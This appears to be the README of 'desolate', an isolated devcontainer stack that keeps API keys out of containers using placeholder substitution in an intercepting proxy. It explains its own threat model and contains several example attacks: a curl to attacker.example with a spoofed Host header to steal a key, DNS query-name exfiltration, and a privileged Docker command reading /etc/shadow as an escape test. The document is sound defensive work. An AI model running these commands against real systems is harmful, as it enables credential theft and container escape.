Containers never hold credentials. They hold a **placeholder**; the real value
lives only in the Colima VM, below the sysbox boundary, and an intercepting
proxy substitutes it in-flight -- and only toward that secret's allowlisted
hosts.

```
devcontainer.json  (git-tracked, safe to commit)
  "containerEnv": { "OPENAI_API_KEY": "MYAPP-OPENAI-KEY" }

Colima VM  /etc/desolate-proxy/settings.json  (0600, VM disk only)
  "MYAPP-OPENAI-KEY": { "value": "sk-real...", "hosts": ["api.openai.com"] }
```

Your code reads `$OPENAI_API_KEY` and sends `Authorization: Bearer
MYAPP-OPENAI-KEY` exactly as normal. On the way out the proxy swaps in the real
key. Responses are scrubbed on the way back, so the real value cannot re-enter
the container even if an endpoint echoes it.

### What "toward that secret's allowlisted hosts" has to mean

The destination is taken from the **TLS SNI**, and the `Host` header must match
it. That distinction is the whole guarantee, and getting it wrong is silent:
an earlier version decided on the `Host` header alone, which the client picks
independently of the IP it connects to. Any container could then run

```bash
curl http://attacker.example/ -H 'Host: api.openai.com' \
     -H 'Authorization: Bearer MYAPP-OPENAI-KEY'
```

and the proxy would substitute the real key and hand it to the attacker. The
same worked over TLS with any certificate the attacker legitimately owned.
Both are in `tests/integration/proxy` now, run against a real transparent
proxy, checking what the attacker's server actually received.

Two consequences you will notice:

- **A secret may not travel over plain HTTP.** Plaintext has no SNI and
  therefore no provable destination, so a placeholder over `http://` is
  refused with 403. Ordinary plaintext traffic (apt, pip) is unaffected.
- SNI must match `Host`. An attacker who instead claims
  `SNI=api.openai.com` toward their own IP cannot finish the handshake --
  mitmproxy verifies the upstream certificate against that name.

### Adding a secret

```bash
./cli.sh secret add MYAPP-OPENAI-KEY --hosts api.openai.com
#   prompts for the value with echo off; it travels on stdin, so it never
#   lands in your shell history, in argv, or in this repo
./cli.sh secret list      # names and allowlists only -- never values
./cli.sh secret rm NAME
```

A project prefix (`MYAPP-*`) is the convention. Two rules are enforced when a
secret is added, and again when the proxy loads its settings -- a secret that
breaks either is refused rather than stored, or dropped rather than loaded:

- **No placeholder may contain another.** Substitution is a plain string
  replace, so with `MYAPP-KEY` and `MYAPP-KEY-2` both registered, a request
  carrying the second is judged against the first's allowlist and receives the
  first's value with a stray `-2` glued on. (A minimum name length used to
  stand in for this check. It never prevented it: both of those names are long.)
- **The allowlist must name where the secret may go.** A secret with no
  allowlist is refused, and so is `--hosts '*'`: a wildcard destination turns
  the placeholder back into a bearer token that any container can post
  anywhere, which is the one thing this design exists to prevent. Wildcards are
  accepted only where a TLS certificate accepts them -- one leading label, over
  a name with at least two literal labels: `*.openai.com` yes, `*.com` and
  `*openai.com` no (a glob does not stop at a dot, so the latter also matches
  `evilopenai.com`).

The `network` rules in `settings.json` are a separate list with a separate job
and still accept `{"host": "*"}` -- see "What this does not give you" below.

### Why this is stronger than a secrets file

- **Exfiltration is bounded.** Compromised code in a project can only leak the
  placeholder. Sending it anywhere outside the allowlist is refused with 403
  and logged -- so the honeypot case is caught, not just survived.
- **Nothing to find.** There is no key material on any container-reachable
  filesystem. Even an escape into the dind container finds only placeholders.
- **The network PATH is default-deny.** Container traffic can leave only via
  the proxy (80/443) and the VM's resolver; every other port is dropped by the
  forward chain, and QUIC is killed so TLS falls back to interceptable TCP.

### What this does not give you

Be precise about the boundary, because the parts that look like guarantees and
are not will bite:

- **Hosts are not restricted by default.** `default_action` ships as `allow`,
  so the path is default-deny but the _destination set_ is not. Set
  `default_action: "deny"` and an explicit `network` allowlist in
  `/etc/desolate-proxy/settings.json` if you want that too.
- **Secrets are not scoped per project.** The proxy sees requests from the
  whole stack and cannot tell which devcontainer sent one. Any project can
  _use_ any other project's placeholder toward that secret's allowlisted hosts
  -- it still cannot read the value, and it cannot send it anywhere else, but
  "project A cannot spend project B's API quota" is not a property this has.
- **DNS is an open channel.** dnsmasq forwards to 1.1.1.1/8.8.8.8 without
  restriction, so a compromised container can exfiltrate data inside query
  names: `<base32-of-your-source>.attacker.com` resolves recursively to the
  attacker's own nameserver, which logs it. Nothing needs to answer -- the
  query _is_ the payload. Two things bound it. Secrets cannot go this way,
  because containers only ever hold placeholders and substitution happens in
  the HTTP proxy, which a DNS query never touches -- the attacker receives the
  literal placeholder. And `log-queries` is on, so it lands in the VM's
  journal: detectable after the fact, not prevented.

  Closing it means an allowlist-only resolver (`server=/allowed.com/1.1.1.1`
  per name, plus `address=/#/` to sink the rest). Before reaching for that,
  note that **DNS is not currently your widest channel**: `default_action`
  ships as `allow`, so DNS-over-HTTPS to any provider is permitted, and that
  is a far better exfil path than encoding data into query names. Tightening
  the resolver while leaving `default_action: allow` buys close to nothing.

- **The inner Docker daemon is not exposed to the host at all** -- this is
  where a `127.0.0.1:2375` socket proxy used to be, and it is worth knowing why
  it is gone. `CONTAINERS=1` is a prefix match on `/containers`, and GET-only
  does not mean read-only: it also granted `/containers/{id}/export` (an entire
  container filesystem) and `/containers/{id}/attach/ws` (stdin to a
  container's main process, reachable by GET), alongside the
  `/containers/{id}/archive` arbitrary read. The knob had no finer setting.
  More fundamentally, the read-only guarantee constrained only the Mac, which
  is already the trust root, while the port itself was unauthenticated HTTP on
  loopback -- reachable from a browser via DNS rebinding in a way a unix socket
  never is. `./cli.sh observe` gives the same view over the orchestrator's
  socket. It is a full-access channel behind fixed subcommands, so it is _not_
  mechanically read-only; that guarantee was traded away knowingly, for the
  smaller surface.

### Local-only secrets

For credentials that are _not_ outbound HTTP -- a local DB password, a signing
key used in-process -- there is nothing to substitute. Use a per-project volume
outside `/workspaces`:

```json
"mounts": ["source=myapp-secrets,target=/secrets,type=volume"]
```

The broker only permits volumes named `<project>` or `<project>-*`, so one
project cannot mount another's.

That rule needs one refinement to actually hold, because **project names can
prefix each other**. With projects `web` and `web-api`, the volume
`web-api-secrets` matches `web-*` too -- so a bare prefix test would let `web`
mount the very volume this section tells `web-api` to keep a password in, and
`web`/`web-api` is an ordinary way to name two services. The broker therefore
awards each volume to the **longest matching project name** among the projects
that exist: `web-api` beats `web` for `web-api-secrets`, and `web` is refused
with a message naming the real owner.

Prefer the proxy whenever the credential is used over HTTPS -- a substituted
secret never enters the container at all, which is strictly better than one
sitting in a volume the container can read.

### The rules that still apply

Never `COPY .env` or `ARG` a real key in a Dockerfile (image layers are
permanent). Placeholders in `devcontainer.json` are fine and intended -- they
are not secret material.

## Isolation model

Boundaries, strongest first:

- **macOS <-> Colima VM** -- a real VM. Any escape at any inner level lands
  here, not on your Mac.
- **VM <-> dind** -- sysbox. The inner dockerd runs in a user namespace where
  container-root maps to an unprivileged VM user, so a compromised dind cannot
  touch the VM. This is the boundary that makes the design safe regardless of
  credential hygiene: even a fully-privileged leaked key in a project can't
  escalate past here to reach other projects or the VM.
- **dind <-> containers** -- Linux namespaces, and the weakest of the three.
  This is the layer to be precise about.

  A project's _workspace_ is properly confined: `workspaceMount` must bind
  exactly `/workspaces/<project>` (source **and** target -- a substring check
  would let `source=/,target=/workspaces/foo` through), volumes are restricted
  to `<project>` / `<project>-*`, and bind mounts are refused outright. So
  projects cannot reach each other's source through anything they declare.

  But `desolate` injects two mounts of its own, which never pass through that
  policy, and both are **executed**:

  | Mount            | Executed by                                                                          | If poisoned                                     |
  | ---------------- | ------------------------------------------------------------------------------------ | ----------------------------------------------- |
  | `/vscode-server` | every devcontainer, on start                                                         | code execution as each project's user           |
  | `/desolate-ca`   | `install-ca.sh`, via `docker exec -u 0` in every devcontainer, and dind's entrypoint | **root** execution in every project and in dind |

  Shared and writable, either is cross-project code execution needing no
  privilege at all -- overwrite one file, and every other project runs it.

  So neither is shared. Each project gets its own **overlayfs** volume whose
  lower layer is the pristine directory. overlayfs never writes down: a
  modification is copied up into that project's own upper layer, and the lower
  is untouched. The protection is structural -- a property of how the filesystem
  works -- rather than a permission flag someone can clear. It costs about 8K
  per project instead of a copy.

  A read-only _flag_ would not have been enough, and that was measured rather
  than assumed. `MS_RDONLY` is per-mount, so a devcontainer with
  `allowPrivileged` -- holding `CAP_SYS_ADMIN` in dind's user namespace -- can
  `mount -o remount,bind,rw` its own copy and write **through to the shared
  file**. An overlay's lower layer is not writable through the overlay by any
  means, so the same attempt changes only that project's own upper.

  `desolate` **refuses to start a project** if an overlay cannot be built --
  there is deliberately no fallback to a shared mount. Each volume is keyed on
  the identity of its lower (the seeded server version; the CA fingerprint), so
  changing either rebuilds every project's view rather than leaving a stale
  upper shadowing newer content. Static tests assert both mounts are volumes and
  never binds, `preflight` checks the live read-only mounts, and
  `tests/integration/stack` performs both attacks against a running stack:
  `E6` for the editor binary, `E7` for the CA scripts -- including the
  privileged remount.

Note that a `--privileged` devcontainer is privileged _relative to dind_, and
dind's own root is already an unprivileged VM user. Capabilities in a
non-initial user namespace apply only to resources that namespace owns, so such
a container cannot load kernel modules, touch VM devices, or reach the VM
however it misbehaves. sysbox is what bounds the damage to dind's contents --
which is precisely why `allowPrivileged` warns about _siblings_ and nothing
beyond them.

## Verifying containment

```bash
./tests/run.sh                 # static + unit: fast, no daemon needed
./tests/run.sh integration     # runs the attacks for real
./cli.sh preflight             # checks a LIVE stack
```

`tests/` carries a named regression case for every escape that has been
demonstrated against this design -- policy bypasses via `initializeCommand`,
compose mode, features, JSONC parser divergence and `runArgs` spellings, plus
secret exfiltration via a spoofed `Host` header. See `tests/README.md`.

`./cli.sh preflight` asserts the stack is up AND that dind runs unprivileged
under sysbox with an active user-namespace (`uid_map` shows container-root
mapping to a non-zero VM uid). It also now proves the _proxy policy_ is live,
not merely that the proxy is running: an addon that fails to load leaves a
working transparent proxy that substitutes nothing, so preflight trips the
leak detector on purpose and expects a 403.

To see it yourself, from a terminal inside any devcontainer:

```bash
cat /proc/self/uid_map                 # e.g. "0 100000 65536": root -> VM uid 100000
docker run --rm --privileged -v /:/host alpine cat /host/etc/shadow
```

The second command is the Red Guild escape. Under sysbox it reads only the
_container's_ placeholder shadow file (all `*`/`!`, no real hashes), not the
VM's -- proof the escape reads nothing of the host.

## Components

- `docker-compose.yml` -- the stack: `volume-init` (one-shot), `dind`
  (sysbox-runc), `vscode` (OpenVSCode Server), `orchestrator` (the broker).
- `cli.sh` -- the one command you run on the Mac (see Daily use).
- `preflight.sh` -- post-start verification, including the containment proof.
- `vscode-image/Dockerfile` also installs **git-lfs** and **git-subrepo**, both
  pinned. git-lfs is configured with `git lfs install --system`, so its filters
  live in `/etc/gitconfig` rather than a home directory -- this image's `$HOME`
  and its passwd entry disagree, and a per-user install could land where git
  never looks. git-subrepo lives in `/opt/git-subrepo` with `GIT_SUBREPO_ROOT`
  set; it is how this repo itself vendors `release/` and `.suede/*`.
- `observe.sh` -- views of the inner daemon from the Mac, via the orchestrator's
  unix socket. Nothing is published to reach it.
- `vscode-image/` -- one image, two roles. `broker.ts` (orchestrator: narrow
  request API, snapshotting and ground-truth resolution), `policy.ts` (the spec
  policy itself -- pure and unit-tested), `snapshot.ts` (the copy that freezes a
  spec, refusing any symlink that leaves the project), `desolate-client.ts` (editor:
  `desolate`), `desolate.ts` (the real runner, `desolate-run`, orchestrator
  only), and `newrepo.ts` (per-repo deploy keys; git only, no daemon needed).
- `tests/` -- static invariants, unit tests and integration tests, including a
  regression case per demonstrated escape. `./tests/run.sh`.
- `vm/` -- VM provisioning. `install.sh` is the single entry point behind
  `./cli.sh vm install` (sysbox, then the proxy); `install-sysbox.sh` is the
  sysbox layer on its own. Both idempotent.
- `proxy/vm/` -- the VM side of the secrets layer: mitmproxy addon (policy,
  substitution, leak detection, response scrubbing), nftables interception,
  dnsmasq resolver, systemd units, and an idempotent `install.sh`.
- `proxy/container/install-ca.sh` -- trusts the proxy CA inside a container.
  You never call it: `desolate` runs it for you.
  Two example projects live in `samples/` in the source repo -- `example-project`
  (a minimal hardened devcontainer) and `sample-fastapi` (the full three-level
  chain plus secrets). They are fixtures and documentation, deliberately outside
  this shipped tree, so they are not part of an install. Copy one into
  `/workspaces/<name>` to try it.

## Configuration

Everything tunable lives in the `.env` next to `docker-compose.yml`, except
`COLIMA_PROFILE`, which is an environment variable for `cli.sh` itself. Defaults
are chosen to work unmodified; you should not need any of this on a normal
machine.

| Variable                     | Default         | What it does                                                                                                                                                            |
| ---------------------------- | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `VSCODE_TOKEN`               | _(required)_    | Gates the editor on `127.0.0.1:$VSCODE_PORT`. `cli.sh up` refuses to start without it.                                                                                  |
| `VSCODE_PORT`                | `3000`          | Host port for the editor, always on `127.0.0.1`. Must sit **outside** `DESOLATE_PORT_MIN..MAX` -- dind publishes that whole range, and `cli.sh up` refuses a collision.  |
| `DESOLATE_PORT_MIN` / `_MAX` | `8080` / `8090` | Host port range for project editors and dev servers. Feeds **both** dind's publish and the allocator -- change them together, here, and nowhere else.                   |
| `COLIMA_PROFILE`             | `desolate`      | Which Colima VM `cli.sh` talks to. Set it if you run more than one.                                                                                                     |
| `DESOLATE_SKIP_VM_CHECK`     | unset           | Skips the egress-interception check in `cli.sh up`. **Not recommended** -- it does not repair anything, it only stops `up` refusing to run with containers unprotected. |

Changing any of the `DESOLATE_*` values takes effect on the next `./cli.sh up`,
which recreates the affected containers.

## Troubleshooting

- **`cli.sh up` says sysbox is missing** -- you're either not on the Colima
  context (`docker context use colima-desolate`) or sysbox isn't installed/
  registered -- run `./cli.sh vm install`.
- **`desolate` errors on `appPort`** -- remove `appPort` from that project's
  devcontainer.json; declare container ports under
  `customizations.desolate.ports` instead.
- **Editor won't load** -- confirm `VSCODE_TOKEN` is set in `.env`; use
  `./cli.sh url` for the correct link. Check `./cli.sh logs`.
- **VM config didn't apply** -- resource flags only take effect when the profile
  is created; `colima delete desolate` and recreate with the flags above. Your
  projects survive this: `colima delete` preserves container data unless you
  pass `--data`.
- **TLS errors inside a devcontainer** -- the proxy CA didn't get installed.
  `desolate` does it automatically as root; if the image lacks
  `update-ca-certificates`, install the CA in your base image instead
  (`proxy/container/install-ca.sh`).
- **`./cli.sh proxy test` shows no interception** -- the nftables rules are
  bound to the wrong bridge. Re-run `sudo ./install.sh` in the VM with the
  stack up; it re-detects.
- **git over SSH fails** -- first check WHERE from. The `:22` accept is scoped
  to the editor bridge, so it fails by design in a devcontainer and no set
  contents will change that; use HTTPS there. From the editor, the forward
  chain is default-deny and allows tcp/22 only to addresses in
  `ssh_allow_v4`/`ssh_allow_v6`. Those hold **GitHub's
  published git ranges**, fetched by `proxy/vm/ssh-allow.sh` at install time and
  refilled after every ruleset reload. Check them:

  ```bash
  colima ssh -p desolate -- sudo nft list set inet desolate ssh_allow_v4
  colima ssh -p desolate -- sudo /opt/desolate-proxy/ssh-allow.sh   # refill by hand
  ```

  An empty set means every clone and push times out with no other symptom, so
  the script refuses to finish rather than leave one. The rules carry counters,
  which say which side you are on:

  ```bash
  colima ssh -p desolate -- sudo nft list table inet desolate | grep -A1 'dport 22'
  ```

  For a host other than GitHub -- a self-hosted git server -- add its range:

  ```bash
  colima ssh -p desolate -- sudo nft add element inet desolate ssh_allow_v4 '{ 10.0.0.0/24 }'
  ```

  That is lost on the next reload; to make it stick, edit `ssh-allow.sh`. Git
  over HTTPS needs none of this -- it goes through the proxy like any other
  traffic, and a personal access token can be a substituted placeholder.

  These sets were filled from DNS until 2026-07-28, keyed on hostname via
  dnsmasq's `nftset=`. That never worked: containers resolve through Docker's
  embedded DNS at `127.0.0.11`, which forwards upstream from a path the
  nftables redirect never sees, so the resolver never observed the lookups.
  `ssh-allow.sh`'s header records that and the three lesser reasons.

- **Pulls fail with "no such host" / "connection refused ... :53"** -- the VM's
  own resolver is down. Two dnsmasq instances are meant to run and they are not
  alternatives: `desolate-dnsmasq` on `:5353` serves _containers_ (via the
  nftables redirect), while Colima's `dnsmasq` on `:53` serves _the VM itself_
  and is what `/etc/resolv.conf` points at. If something set a global `port=`
  on the system one -- a stray drop-in in `/etc/dnsmasq.d/` -- `:53` is left
  unserved and every image pull fails with an error that sounds like Docker.
  `./cli.sh vm status` shows `vm dns:`; `./cli.sh vm install` re-asserts both.
- **Commands act on the wrong machine** -- `cli.sh` reaches the VM two ways:
  `docker` (your current context) and `colima ssh -p $COLIMA_PROFILE`. If those
  are different VMs, `down` removes containers the installer cannot see and
  `vm install` provisions a VM your stack is not on. `./cli.sh vm status` prints
  both; `up` and `vm install` refuse outright when they disagree.
- **Deleting and recreating the VM did not clear `/workspaces`** -- this is
  Colima behaving as documented, not a mistake on your part. **`colima delete`
  removes the VM but PRESERVES container data** (images and volumes) by
  default, and restores it when the profile is recreated with the same runtime.
  See [Colima's data persistence
  docs](https://colima.run/docs/commands/#colima-delete).

  It is easy to assume otherwise, because `desolate_workspaces` is an ordinary
  named volume with no host path anywhere -- so "the VM is gone" feels like it
  must be gone too. It is not.

  Pick the teardown that matches what you actually want:

  ```bash
  ./cli.sh down -v                   # projects, settings + inner images; VM untouched
  colima delete --data desolate      # VM *and* all container data
  colima delete desolate             # VM only -- your projects come back
  ```

  `./cli.sh down -v` is usually the one you want, and it prompts, because it
  deletes every project. Note this cuts both ways: recreating the VM to change
  its CPU/memory flags keeps your work, which is the helpful case.

- **`error setting rlimit type 7: operation not permitted`** -- this host's sysbox
  gives the inner daemon a lower fd ceiling than the 524288 in
  `docker-compose.yml` (the `--default-ulimit=nofile` flag and dind's `ulimits`).
  Check it with
  `docker run --rm --runtime=sysbox-runc alpine sh -c 'ulimit -Hn'` and lower
  both to fit under what it prints.
- **A Feature fails to install with a certificate error** -- that should not
  happen for `"image"`-based projects; `desolate` derives a CA-trusting base for
  them (see "Features and build-time downloads"). It _is_ expected for projects
  that build from their own `Dockerfile`, which are not covered.
- **Everything broke, need internet now** -- in the VM:
  `sudo nft delete table inet desolate` removes interception;
  `sudo systemctl restart desolate-nft` puts it back.
